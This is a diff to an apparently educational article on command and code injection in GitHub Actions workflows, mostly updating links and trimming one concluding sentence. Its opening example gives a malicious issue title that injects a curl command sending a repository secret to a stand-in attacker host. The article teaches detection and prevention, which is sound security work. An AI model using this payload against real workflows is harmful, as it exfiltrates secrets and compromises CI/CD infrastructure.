@@ -11,11 +11,11 @@ tags:
 
 # Injection Attacks in GitHub Actions
 
-A user opens a GitHub issue titled `"; curl http://attacker.site?token=${{ secrets.SERVICE_SECRET }}; x="`, and a few seconds later, your GitHub Actions runner silently executes it. Just like that, a secret is exfiltrated. This isn’t hypothetical—this is a textbook example of [command injection](overview) in GitHub Actions.
+A user opens a GitHub issue titled `"; curl http://attacker.site?token=${{ secrets.SERVICE_SECRET }}; x="`, and a few seconds later, your GitHub Actions runner silently executes it. Just like that, a secret is exfiltrated. This isn’t hypothetical—this is a textbook example of [command injection](/learn/vulnerabilities/command-injection) in GitHub Actions.
 
 Modern CI/CD pipelines like GitHub Actions automate everything from testing and building to deploying production code. But when workflows are written insecurely, they can become an attacker’s playground. This risk is especially relevant when user-supplied data flows directly into commands or scripts.
 
-There are also potential for [code injection](../code-injection/overview) where instead of executing a command, source code is included in the configuration to run. So both command and code injection have a common security vulnerability theme, untrusted user input including in GitHub Actions workflows can lead to exfiltrating tokens, compromising infrastructure, or creating releases to distribute malware.
+There are also potential for [code injection](/learn/vulnerabilities/code-injection) where instead of executing a command, source code is included in the configuration to run. So both command and code injection have a common security vulnerability theme, untrusted user input including in GitHub Actions workflows can lead to exfiltrating tokens, compromising infrastructure, or creating releases to distribute malware.
 
 In this article, we’ll break down how command and code injection can happen in GitHub Actions, explore common attack patterns, show how to detect it in code, and end with practical advice to avoid these issues in your own workflows.
 
@@ -190,4 +190,4 @@ Treat all input from issue titles, comments, and forked pull requests as tainted
 
 GitHub Actions provides helpful automation, but executing CI/CD operations comes with risks. If user-controlled input is inserted into commands without protection, attackers can run their own code in your CI/CD environment. At best, this leads to wasted resources. At worst, it exposes tokens, secrets, and codebases to compromise.
 
-In this article, we explored how command injection happens in GitHub Actions, what it looks like in real workflows, and how to detect and prevent it. The most effective mitigation is simple: **don’t let user input get evaluated as code**.
+In this article, we explored how command injection happens in GitHub Actions, what it looks like in real workflows, and how to detect and prevent it.
